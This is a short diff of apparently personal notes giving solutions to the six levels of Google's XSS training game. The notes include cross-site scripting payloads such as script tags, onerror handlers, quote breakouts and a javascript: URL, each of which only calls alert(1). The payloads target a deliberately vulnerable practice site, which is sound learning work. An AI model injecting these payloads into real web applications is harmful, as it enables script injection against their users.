@@ -1,5 +1,19 @@
 first attack:
-https://xss-game.appspot.com/level1/frame?query=<script>alert()</script>
+https://xss-game.appspot.com/level1/frame?query=<script>alert(1)</script>
 
 second attack:
-<img src="wrong_cheming" onerror="alert()">
+<img src=x onerror="alert(1)">
+
+third attack:
+https://xss-game.appspot.com/level3/frame#3' onerror=alert(1)>
+
+fourth:
+https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar b=('
+to counter the basic encoding
+
+fifth:
+https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1) from the main page
+put a fake email and click on next to trigger the script
+
+sixth:
+put my own script instead of the gadget.js
